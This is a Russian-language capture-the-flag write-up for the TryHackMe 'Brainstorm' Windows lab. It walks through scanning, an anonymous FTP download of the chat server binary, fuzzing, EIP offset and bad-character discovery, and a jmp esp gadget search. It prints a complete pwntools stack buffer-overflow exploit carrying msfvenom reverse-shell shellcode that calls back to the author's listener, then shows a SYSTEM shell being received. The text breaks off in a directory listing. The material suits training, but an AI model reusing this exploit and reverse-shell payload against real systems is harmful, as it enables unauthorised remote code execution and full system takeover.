# TryHackMe - Win Medium - Brainstorm

📅 Дата: 2025-07-23  
🧠 Сложность: Medium  
💻 IP-адрес: 10.10.206.118  

---

## Sugar

```bash
nmap_ctf() {
  local ip=$1
  sudo nmap -sS -p- -Pn --max-parallelism 100 --min-rate 1000 -v -oN nmap-sS.txt $ip && nmap -sT -Pn -sV -T4 -A -v -p "$(grep -oP \"^[0-9]+(?=/tcp\s+open)\" nmap-sS.txt | sort -n | paste -sd \",\")" -oN nmap-sV.txt $ip
}
```


## 🔍 Сканирование

```bash
export ip=10.10.206.118 && nmap_ctf $ip
```

### nmap

```bash
PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2025-07-23T12:49:18+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=brainstorm
| Issuer: commonName=brainstorm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-07-22T12:27:55
| Not valid after:  2026-01-21T12:27:55
| MD5:   e48d:29db:a794:ae6b:e58a:83f4:9e02:7a84
|_SHA-1: 5382:63ad:2a30:2735:c33b:1e13:a599:f9f8:5ce5:9fcb
| rdp-ntlm-info: 
|   Target_Name: BRAINSTORM
|   NetBIOS_Domain_Name: BRAINSTORM
|   NetBIOS_Computer_Name: BRAINSTORM
|   DNS_Domain_Name: brainstorm
|   DNS_Computer_Name: brainstorm
|   Product_Version: 6.1.7601
|_  System_Time: 2025-07-23T12:48:48+00:00
9999/tcp open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     Welcome to Brainstorm chat (beta)
|     Please enter your username (max 20 characters): Write a message:
|   NULL: 
|     Welcome to Brainstorm chat (beta)
|_    Please enter your username (max 20 characters):
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.94SVN%I=7%D=7/23%Time=6880D981%P=x86_64-pc-linux-gnu%r
SF:(NULL,52,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20en
SF:ter\x20your\x20username\x20\(max\x2020\x20characters\):\x20")%r(GetRequ
SF:est,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20ente
SF:r\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x20
SF:message:\x20")%r(HTTPOptions,63,"Welcome\x20to\x20Brainstorm\x20chat\x2
SF:0\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20charac
SF:ters\):\x20Write\x20a\x20message:\x20")%r(FourOhFourRequest,63,"Welcome
SF:\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20us
SF:ername\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%
SF:r(JavaRMI,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x
SF:20enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x2
SF:0a\x20message:\x20")%r(GenericLines,63,"Welcome\x20to\x20Brainstorm\x20
SF:chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x2
SF:0characters\):\x20Write\x20a\x20message:\x20")%r(RTSPRequest,63,"Welcom
SF:e\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20u
SF:sername\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")
SF:%r(RPCCheck,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease
SF:\x20enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\
SF:x20a\x20message:\x20")%r(DNSVersionBindReqTCP,63,"Welcome\x20to\x20Brai
SF:nstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(ma
SF:x\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(DNSStatusReq
SF:uestTCP,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20
SF:enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a
SF:\x20message:\x20")%r(Help,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(
SF:beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20character
SF:s\):\x20Write\x20a\x20message:\x20")%r(SSLSessionReq,63,"Welcome\x20to\
SF:x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\
SF:x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(Termi
SF:nalServerCookie,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPl
SF:ease\x20enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Wr
SF:ite\x20a\x20message:\x20");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Phone|8.1 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1:r1
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (88%), Microsoft Windows Server 2008 (87%), Microsoft Windows Server 2008 R2 (87%), Microsoft Windows Server 2008 R2 or Windows 8 (87%), Microsoft Windows 7 SP1 (87%), Microsoft Windows 8.1 Update 1 (87%), Microsoft Windows Phone 7.5 or 8.0 (87%), Microsoft Windows Embedded Standard 7 (86%), Microsoft Windows 8.1 R1 (85%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.016 days (since Wed Jul 23 08:25:43 2025)
TCP Sequence Prediction: Difficulty=265 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 0s

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   216.12 ms 10.21.0.1
2   ... 30
```

---

## 🕵️ Enumeration

На порту 9999 висит какой-то чат, видимо его и будем эксплуатировать
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub]
└─$ nc 10.10.206.118 9999
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): max
Write a message: Hi


Wed Jul 23 05:48:01 2025
max said: Hi


Write a message:  ^C
```

### ftp
`ftp` позволяет анонимное соединение.
Подключаюсь и скачиваю файлы к себе, похоже, что это файлы того самого чата, что висит на 9999
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Brainstorm/exploits]
└─$ ftp 10.10.206.118
Connected to 10.10.206.118.
220 Microsoft FTP Service
Name (10.10.206.118:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful.
125 Data connection already open; Transfer starting.
08-29-19  08:36PM       <DIR>          chatserver
226 Transfer complete.
ftp> cd chatserver
250 CWD command successful.
ftp> ls
200 EPRT command successful.
125 Data connection already open; Transfer starting.
08-29-19  10:26PM                43747 chatserver.exe
08-29-19  10:27PM                30761 essfunc.dll
226 Transfer complete.
ftp> binary
200 Type set to I.
ftp> mget *.*
mget chatserver.exe [anpqy?]? y
200 EPRT command successful.
125 Data connection already open; Transfer starting.
100% |*********************************************************************| 43747       38.80 KiB/s    00:00 ETA
226 Transfer complete.
43747 bytes received in 00:01 (38.79 KiB/s)
mget essfunc.dll [anpqy?]? y
200 EPRT command successful.
125 Data connection already open; Transfer starting.
100% |*********************************************************************| 30761       34.74 KiB/s    00:00 ETA
226 Transfer complete.
30761 bytes received in 00:00 (34.74 KiB/s)
ftp> exit
221 Goodbye.
```

Информация по файлам
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Brainstorm/exploits]
└─$ file essfunc.dll 
essfunc.dll: PE32 executable for MS Windows 4.00 (DLL), Intel i386 (stripped to external PDB), 9 sections
                                                                                                                  
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Brainstorm/exploits]
└─$ file chatserver.exe
chatserver.exe: PE32 executable for MS Windows 4.00 (console), Intel i386 (stripped to external PDB), 7 sections
```

### radare2
chatserver.exe
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Brainstorm/exploits]
└─$ rabin2 -I chatserver.exe
arch     x86
baddr    0x400000
binsz    43747
bintype  pe
bits     32
canary   true
injprot  false
retguard false
class    PE32
cmp.csum 0x0000b072
compiled Mon Sep 11 19:08:08 1972
crypto   false
endian   little
havecode true
hdr.csum 0x0000b072
laddr    0x0
lang     c
linenum  true
lsyms    false
machine  i386
nx       false
os       windows
overlay  true
cc       cdecl
pic      false
relocs   true
signed   false
sanitize false
static   false
stripped true
subsys   Windows CUI
va       true
```

essfunc.dll
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Brainstorm/exploits]
└─$ rabin2 -I essfunc.dll   
arch     x86
baddr    0x62500000
binsz    30761
bintype  pe
bits     32
canary   true
injprot  false
retguard false
class    PE32
cmp.csum 0x00011053
compiled Thu Jan  1 13:12:16 1970
crypto   false
endian   little
havecode true
hdr.csum 0x00011053
laddr    0x0
lang     c
linenum  true
lsyms    false
machine  i386
nx       false
os       windows
overlay  true
cc       cdecl
pic      false
relocs   false
signed   false
sanitize false
static   false
stripped true
subsys   Windows CUI
va       true
```

Резюме по файлам:
- `arch     x86`
- `nx       false`
  - стек и куча исполняемые
- `canary   true`
  - убью при перезаписи EIP
- `stripped true`
  - вряд ли стоит смотреть в ghidra, код будет непонятным

При этом есть различия в `ASLR (Address Space Layout Randomization)`
- `chatserver.exe`
  - `pic      false` — код не является позиционно-независимым (Position Independent Code).
  - `relocs   true`  — присутствуют записи перемещения (relocation records).
Для исполняемого файла (exe) это означает, что ASLR может быть поддержан, если операционная система включает эту функцию.  
Исполняемые файлы могут быть загружены по случайному адресу, даже если они не являются PIC, при наличии записей перемещения.

Из этого следует, что, возможно, инструкцию `call esp/jmp esp` для вызова кода из стека, нужно искать в `DLL`, где адреса точно постоянны.

Запускаю `chatserver.exe` на Windows машине с `immunity debugger`
Создаю рабочую директорию  
```python
!mona config -set workingfolder c:\mona\%p
```
<img width="1918" height="1016" alt="image" src="https://github.com/user-attachments/assets/c67671c4-bbcb-4fc6-ad44-81a2af470664" />

Далее создаю шаблон с помощью `pwntool`
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Brainstorm/exploits]
└─$ actv
                                                                                                                  
┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Brainstorm/exploits]
└─$ pwn template ./chatserver.exe --quiet --host 192.168.56.124 --port 9999 > x.py 
[*] Automatically detecting challenge binaries...
```

После каждого введенного `Message`, приложение запрашивает новое, так что можно не переподключаться для фаззинга, а работать в одной сессии
```python
from pwn import *

context.update(arch='i386')
exe = './chatserver.exe'

host = args.HOST or '192.168.56.124'
port = int(args.PORT or 9999)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe] + argv, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# ==================== LOCAL  CONSTANTS =====================
USERNAME = b'--pentest'
# ==================== OPTIMIZED FUZZER =====================
def run_fuzzer():
    io = start()

    print(io.recvuntil(b'Please enter your username (max 20 characters): ').decode('utf-8'))
    io.sendline(USERNAME)
    print(USERNAME)
    print(io.recvuntil(b'Write a message: ').decode('utf-8'))

    pattern = cyclic(5000)  # Generate smart pattern
    chunk_size = 100
    max_size = 5000
    timeout = 2

    for i in range(0, max_size, chunk_size):
        try:
            current_payload = pattern[:i]
            log.info(f"Sending {len(current_payload)} bytes")
            io.sendline(current_payload)
            response = io.recv(timeout=timeout)
            if not response:
                log.success(f"Server stopped responding at [{i}] bytes")
                break
            if b'Write a message:' not in response:
                log.success(f"Unexpected response at [{i}] bytes")
                break
        except EOFError:
            log.success(f"Server crashed at ~[{i}] bytes")
            break
        except Exception as e:
            log.warning(f"Error at [{i}] bytes: {str(e)}")
            break

    # Try to interact if crash detected
    try:
        io.interactive()
    except:
        pass

# ==================== MAIN =====================
if __name__ == '__main__':
    run_fuzzer()
```

Приложение крашится при отправке 2100 байт
```bash
┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Brainstorm/exploits]
└─$ python3 x.py
[+] Opening connection to 192.168.56.124 on port 9999: Done
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): 
b'--pentest'
Write a message: 
[*] Sending 0 bytes
[*] Sending 100 bytes
[*] Sending 200 bytes
[*] Sending 300 bytes
[*] Sending 400 bytes
[*] Sending 500 bytes
[*] Sending 600 bytes
[*] Sending 700 bytes
[*] Sending 800 bytes
[*] Sending 900 bytes
[*] Sending 1000 bytes
[*] Sending 1100 bytes
[*] Sending 1200 bytes
[*] Sending 1300 bytes
[*] Sending 1400 bytes
[*] Sending 1500 bytes
[*] Sending 1600 bytes
[*] Sending 1700 bytes
[*] Sending 1800 bytes
[*] Sending 1900 bytes
[*] Sending 2000 bytes
[*] Sending 2100 bytes
[+] Server stopped responding at [2100] bytes
[*] Switching to interactive mode
$  
```

Сразу смотрю стек и регистры  
<img width="1918" height="975" alt="image" src="https://github.com/user-attachments/assets/546e0656-ee6e-4a88-8a1b-4ee0ba17030b" />  

Добавляю в скрипт функцию `get_offset()` перед вызовом `__main__`  
```python
def get_offset():
    eip_value = 0x75616164
    offset = cyclic_find(p32(eip_value))
    log.success(f"Offset: [{offset}] bytes")

# ==================== MAIN =====================
if __name__ == '__main__':
    #run_fuzzer()
    get_offset()
```

И снова запускаю скрипт
```bash
┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Brainstorm/exploits]
└─$ python3 x.py
[+] Offset [2012] bytes
```

Теперь можно перейти к написанию кода эксплуатации.  
Сперва нужно убедиться, что я контролирую `EIP` и `stack`  
Добавляю в скрипт функцию `run_exploit()`  
```python
def run_exploit():
    offset = 2012
    junk   = b'A' * offset
    EIP    = b'B' * 4
    stack  = b'C' * 12

    payload = b''.join([
        junk,
        EIP,
        stack,
    ])

    try:
        io = start()
        print(io.recvuntil(b'Please enter your username (max 20 characters): ').decode('utf-8'))
        io.sendline(USERNAME)
        print(USERNAME)
        print(io.recvuntil(b'Write a message: ').decode('utf-8'))
        io.sendline(payload)
        try:
            response = io.recv(timeout=RESPONSE_TIMEOUT)
            if response:
                log.warning(f"Server responded unexpectedly: {response[:100]}...")
            else:
                log.success("Server stopped responding - likely crashed!")
        except EOFError:
            log.success("Connection closed by server - likely crashed!")

    except Exception as e:
        log.error(f"Error during exploitation: {str(e)}")
    finally:
        try:
            io.close()
        except:
            pass

    log.info("Test completed. Check debugger for EIP value (should be 42424242).")

# ==================== MAIN =====================
if __name__ == '__main__':
    run_exploit()
```

Перезапускаю отладку в дебаггере и запускаю скрипт  
```bash
┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Brainstorm/exploits]
└─$ python3 x.py
[+] Opening connection to 192.168.56.124 on port 9999: Done
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): 
b'--pentest'
Write a message: 
[+] Server stopped responding - likely crashed!
[*] Closed connection to 192.168.56.124 port 9999
[*] Test completed. Check debugger for EIP value (should be 42424242).
```

И убеждаюсь, что, действительно, контролирую `EIP` и `stack`
<img width="1915" height="974" alt="image" src="https://github.com/user-attachments/assets/a0729223-ea6c-4310-b57c-40e5fcc2f3f9" />  

Приступаю к нахождению бэдчаров.
Генерирую в `immunity debugger` последовательность без нулевого байта  
```python
!mona bytearray -b "\x00"
```

Меняю функцию 
```python
def run_exploit():
    offset = 2012
    junk   = b'A' * offset
    EIP    = b'B' * 4

    exclude_list = ['\\x00']
    stack = ''.join(f'\\x{x:02x}' for x in range(1, 256) if f'\\x{x:02x}' not in exclude_list)

    payload = b''.join([
        junk,
        EIP,
        stack.encode('latin-1'),
    ])

    try:
        io = start()
        print(io.recvuntil(b'Please enter your username (max 20 characters): ').decode('utf-8'))
        io.sendline(USERNAME)
        print(USERNAME)
        print(io.recvuntil(b'Write a message: ').decode('utf-8'))
        io.sendline(payload)
        try:
            response = io.recv(timeout=RESPONSE_TIMEOUT)
            if response:
                log.warning(f"Server responded unexpectedly: {response[:100]}...")
            else:
                log.success("Server stopped responding - likely crashed!")
        except EOFError:
            log.success("Connection closed by server - likely crashed!")

    except Exception as e:
        log.error(f"Error during exploitation: {str(e)}")
    finally:
        try:
            io.close()
        except:
            pass

    log.info('Test completed. Check debugger for ESP value')
```

Перезапускаю приложение в отладчике и запускаю скрипт
```bash
┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Brainstorm/exploits]
└─$ python3 x.py
/home/kali/Labs/TryHackMe/Win Medium - Brainstorm/exploits/x.py:123: SyntaxWarning: invalid escape sequence '\m'
  log.info('and run [!mona compare -f "c:\mona\brainpan\bytearray.bin" -a {esp_address}]')
[+] Opening connection to 192.168.56.124 on port 9999: Done
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): 
b'--pentest'
Write a message: 
[+] Server stopped responding - likely crashed!
[*] Closed connection to 192.168.56.124 port 9999
[*] Test completed. Check debugger for ESP value
```
<img width="1910" height="976" alt="image" src="https://github.com/user-attachments/assets/00a174e5-5af8-4e00-bb4a-3311ef2596ae" />  

И смотрю таблицу  
```python
!mona compare -f "c:\mona\chatserver\bytearray.bin" -a 0204EEC0
```
<img width="376" height="325" alt="image" src="https://github.com/user-attachments/assets/ea9e90a6-6afa-46c4-ad45-db251f52155a" />  

- Кроме `x00` бэдчаров нет.  
  
Далее нужно найти функцию для вызова кода из стека в `essfunc.dll`  
Для этого использую `ROPgadget`  
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Brainstorm/exploits]
└─$ ROPgadget --binary ./essfunc.dll > essfunc.allgadgets.txt
                                                                                                                  
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Brainstorm/exploits]
└─$ grep -iE "call esp" essfunc.allgadgets.txt | awk -F';' 'NF <= 2' 
                                                                                                                  
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Brainstorm/exploits]
└─$ grep -iE "jmp esp" essfunc.allgadgets.txt | awk -F';' 'NF <= 2'
0x625014df : jmp esp
0x625014dd : mov ebp, esp ; jmp esp
```

Теперь EIP в скрипте можно заменить на `EIP = 0x625014df`

## 📂 Получение доступа

Следующий шаг: создание полезной нагрузки.  
Буду использовать `windows/shell_reverse_tcp` и сразу укажу свой `ip` в сети `thm`  
```bash
┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Brainstorm/exploits]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.21.104.16 LPORT=4444 -f py -b '\x00' -v stack
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of py file: 1807 bytes
stack =  b""
stack += b"\xd9\xed\xba\x6e\x49\x7a\x91\xd9\x74\x24\xf4\x5d"
stack += b"\x29\xc9\xb1\x52\x31\x55\x17\x83\xed\xfc\x03\x3b"
stack += b"\x5a\x98\x64\x3f\xb4\xde\x87\xbf\x45\xbf\x0e\x5a"
stack += b"\x74\xff\x75\x2f\x27\xcf\xfe\x7d\xc4\xa4\x53\x95"
stack += b"\x5f\xc8\x7b\x9a\xe8\x67\x5a\x95\xe9\xd4\x9e\xb4"
stack += b"\x69\x27\xf3\x16\x53\xe8\x06\x57\x94\x15\xea\x05"
stack += b"\x4d\x51\x59\xb9\xfa\x2f\x62\x32\xb0\xbe\xe2\xa7"
stack += b"\x01\xc0\xc3\x76\x19\x9b\xc3\x79\xce\x97\x4d\x61"
stack += b"\x13\x9d\x04\x1a\xe7\x69\x97\xca\x39\x91\x34\x33"
stack += b"\xf6\x60\x44\x74\x31\x9b\x33\x8c\x41\x26\x44\x4b"
stack += b"\x3b\xfc\xc1\x4f\x9b\x77\x71\xab\x1d\x5b\xe4\x38"
stack += b"\x11\x10\x62\x66\x36\xa7\xa7\x1d\x42\x2c\x46\xf1"
stack += b"\xc2\x76\x6d\xd5\x8f\x2d\x0c\x4c\x6a\x83\x31\x8e"
stack += b"\xd5\x7c\x94\xc5\xf8\x69\xa5\x84\x94\x5e\x84\x36"
stack += b"\x65\xc9\x9f\x45\x57\x56\x34\xc1\xdb\x1f\x92\x16"
stack += b"\x1b\x0a\x62\x88\xe2\xb5\x93\x81\x20\xe1\xc3\xb9"
stack += b"\x81\x8a\x8f\x39\x2d\x5f\x1f\x69\x81\x30\xe0\xd9"
stack += b"\x61\xe1\x88\x33\x6e\xde\xa9\x3c\xa4\x77\x43\xc7"
stack += b"\x2f\x72\x81\xaf\xbf\xea\xab\x2f\xd1\xb6\x22\xc9"
stack += b"\xbb\x56\x63\x42\x54\xce\x2e\x18\xc5\x0f\xe5\x65"
stack += b"\xc5\x84\x0a\x9a\x88\x6c\x66\x88\x7d\x9d\x3d\xf2"
stack += b"\x28\xa2\xeb\x9a\xb7\x31\x70\x5a\xb1\x29\x2f\x0d"
stack += b"\x96\x9c\x26\xdb\x0a\x86\x90\xf9\xd6\x5e\xda\xb9"
stack += b"\x0c\xa3\xe5\x40\xc0\x9f\xc1\x52\x1c\x1f\x4e\x06"
stack += b"\xf0\x76\x18\xf0\xb6\x20\xea\xaa\x60\x9e\xa4\x3a"
stack += b"\xf4\xec\x76\x3c\xf9\x38\x01\xa0\x48\x95\x54\xdf"
stack += b"\x65\x71\x51\x98\x9b\xe1\x9e\x73\x18\x11\xd5\xd9"
stack += b"\x09\xba\xb0\x88\x0b\xa7\x42\x67\x4f\xde\xc0\x8d"
stack += b"\x30\x25\xd8\xe4\x35\x61\x5e\x15\x44\xfa\x0b\x19"
stack += b"\xfb\xfb\x19"
```

Сохраняю `stack`, добавляю немного `nop` и проверяю против целевой машины, предварительно запустив `nc`  
Итоговый код скрипта
```python
from pwn import *

context.update(arch='i386')
exe = './chatserver.exe'

host = args.HOST or '10.10.116.242'
port = int(args.PORT or 9999)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe] + argv, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# ==================== LOCAL  CONSTANTS =====================
USERNAME = b'--pentest'
RESPONSE_TIMEOUT = 2
# ==================== OPTIMIZED FUZZER =====================
def run_fuzzer():
    io = start()

    print(io.recvuntil(b'Please enter your username (max 20 characters): ').decode('utf-8'))
    io.sendline(USERNAME)
    print(USERNAME)
    print(io.recvuntil(b'Write a message: ').decode('utf-8'))

    pattern = cyclic(5000)  # Generate smart pattern
    chunk_size = 100
    max_size = 5000

    for i in range(0, max_size, chunk_size):
        try:
            current_payload = pattern[:i]
            log.info(f"Sending {len(current_payload)} bytes")

            io.sendline(current_payload)
            response = io.recv(timeout=RESPONSE_TIMEOUT)

            if not response:
                log.success(f"Server stopped responding at [{i}] bytes")
                break

            if b'Write a message:' not in response:
                log.success(f"Unexpected response at [{i}] bytes")
                break

        except EOFError:
            log.success(f"Server crashed at ~[{i}] bytes")
            break
        except Exception as e:
            log.warning(f"Error at [{i}] bytes: {str(e)}")
            break

    # Try to interact if crash detected
    try:
        io.interactive()
    except:
        pass

def get_offset():
    eip_value = 0x75616164
    offset = cyclic_find(p32(eip_value))
    log.success(f"Offset [{offset}] bytes")

def run_exploit():
    offset = 2012
    junk   = b'A' * offset
    EIP    = 0x625014df         # 0x625014df : jmp esp
    nop    = b'\x90' * 16

    #exclude_list = ['\\x00']
    #stack = ''.join(f'\\x{x:02x}' for x in range(1, 256) if f'\\x{x:02x}' not in exclude_list)

    stack = b""
    stack += b"\xd9\xed\xba\x6e\x49\x7a\x91\xd9\x74\x24\xf4\x5d"
    stack += b"\x29\xc9\xb1\x52\x31\x55\x17\x83\xed\xfc\x03\x3b"
    stack += b"\x5a\x98\x64\x3f\xb4\xde\x87\xbf\x45\xbf\x0e\x5a"
    stack += b"\x74\xff\x75\x2f\x27\xcf\xfe\x7d\xc4\xa4\x53\x95"
    stack += b"\x5f\xc8\x7b\x9a\xe8\x67\x5a\x95\xe9\xd4\x9e\xb4"
    stack += b"\x69\x27\xf3\x16\x53\xe8\x06\x57\x94\x15\xea\x05"
    stack += b"\x4d\x51\x59\xb9\xfa\x2f\x62\x32\xb0\xbe\xe2\xa7"
    stack += b"\x01\xc0\xc3\x76\x19\x9b\xc3\x79\xce\x97\x4d\x61"
    stack += b"\x13\x9d\x04\x1a\xe7\x69\x97\xca\x39\x91\x34\x33"
    stack += b"\xf6\x60\x44\x74\x31\x9b\x33\x8c\x41\x26\x44\x4b"
    stack += b"\x3b\xfc\xc1\x4f\x9b\x77\x71\xab\x1d\x5b\xe4\x38"
    stack += b"\x11\x10\x62\x66\x36\xa7\xa7\x1d\x42\x2c\x46\xf1"
    stack += b"\xc2\x76\x6d\xd5\x8f\x2d\x0c\x4c\x6a\x83\x31\x8e"
    stack += b"\xd5\x7c\x94\xc5\xf8\x69\xa5\x84\x94\x5e\x84\x36"
    stack += b"\x65\xc9\x9f\x45\x57\x56\x34\xc1\xdb\x1f\x92\x16"
    stack += b"\x1b\x0a\x62\x88\xe2\xb5\x93\x81\x20\xe1\xc3\xb9"
    stack += b"\x81\x8a\x8f\x39\x2d\x5f\x1f\x69\x81\x30\xe0\xd9"
    stack += b"\x61\xe1\x88\x33\x6e\xde\xa9\x3c\xa4\x77\x43\xc7"
    stack += b"\x2f\x72\x81\xaf\xbf\xea\xab\x2f\xd1\xb6\x22\xc9"
    stack += b"\xbb\x56\x63\x42\x54\xce\x2e\x18\xc5\x0f\xe5\x65"
    stack += b"\xc5\x84\x0a\x9a\x88\x6c\x66\x88\x7d\x9d\x3d\xf2"
    stack += b"\x28\xa2\xeb\x9a\xb7\x31\x70\x5a\xb1\x29\x2f\x0d"
    stack += b"\x96\x9c\x26\xdb\x0a\x86\x90\xf9\xd6\x5e\xda\xb9"
    stack += b"\x0c\xa3\xe5\x40\xc0\x9f\xc1\x52\x1c\x1f\x4e\x06"
    stack += b"\xf0\x76\x18\xf0\xb6\x20\xea\xaa\x60\x9e\xa4\x3a"
    stack += b"\xf4\xec\x76\x3c\xf9\x38\x01\xa0\x48\x95\x54\xdf"
    stack += b"\x65\x71\x51\x98\x9b\xe1\x9e\x73\x18\x11\xd5\xd9"
    stack += b"\x09\xba\xb0\x88\x0b\xa7\x42\x67\x4f\xde\xc0\x8d"
    stack += b"\x30\x25\xd8\xe4\x35\x61\x5e\x15\x44\xfa\x0b\x19"
    stack += b"\xfb\xfb\x19"

    payload = b''.join([
        junk,
        p32(EIP),
        nop,
        stack,
    ])

    try:
        io = start()
        print(io.recvuntil(b'Please enter your username (max 20 characters): ').decode('utf-8'))
        io.sendline(USERNAME)
        print(USERNAME)
        print(io.recvuntil(b'Write a message: ').decode('utf-8'))
        io.sendline(payload)
        try:
            response = io.recv(timeout=RESPONSE_TIMEOUT)
            if response:
                log.warning(f"Server responded unexpectedly: {response[:100]}...")
            else:
                log.success("Server stopped responding - likely crashed!")
        except EOFError:
            log.success("Connection closed by server - likely crashed!")

    except Exception as e:
        log.error(f"Error during exploitation: {str(e)}")
    finally:
        try:
            io.close()
        except:
            pass

# ==================== MAIN =====================
if __name__ == '__main__':
    #run_fuzzer()
    #get_offset()
    run_exploit()
```

Получаю reverse shell и читаю флаг
```bash
┌──(kali㉿0x2d-pentest)-[/media/sf_Exchange]
└─$ nc -lvnp 4444        
listening on [any] 4444 ...
connect to [10.21.104.16] from (UNKNOWN) [10.10.116.242] 49228
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd c:\Users

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C87F-5040

 Directory of c:\Users

08/29/2019  10:20 PM    <DIR>          .
08/29/2019  10:20 PM    <DIR>          ..
